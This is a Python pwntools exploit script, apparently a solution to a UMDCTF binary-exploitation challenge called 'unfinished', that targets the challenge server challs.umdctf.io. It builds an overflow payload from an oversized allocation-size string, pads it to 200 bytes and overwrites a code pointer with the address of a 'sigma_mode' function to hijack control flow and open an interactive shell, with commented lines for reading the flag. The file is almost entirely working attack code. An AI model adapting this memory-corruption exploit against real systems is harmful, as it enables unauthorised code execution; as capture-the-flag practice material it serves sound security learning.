from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./unfinished"
libc_path = "./libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
# libc, roplibc = ELF(libc_path), ROP(libc_path)
payload = b""
if not f_remote:
    io = process([vuln_path])
    # io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
    payload  = b"10000000000"
else:
    io = remote("challs.umdctf.io", 31003)
    payload = b"40960000000000"
    # io = remote("192.168.2.126", 1447)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))

system_adr = 0x4019ba

number = 0x41f060
atol_got = 0x41ef00

handler = 0x41F128

sigma_mode_addr = 0x4019B6    

io.timeout = 3
payload += b"\x00"
log.hexdump(payload)
payload += b"A" * (200 - len(payload)) 
payload += p64(sigma_mode_addr)       


ddebug("b *0x0403544\ncontinue")
io.sendlineafter(b"What size allocation?\n", payload)
# io.sendline(b"cat flag")
# flag=io.recvuntil(b"flag")
# if b"flag" in flag:
#     raw_input()

io.interactive()


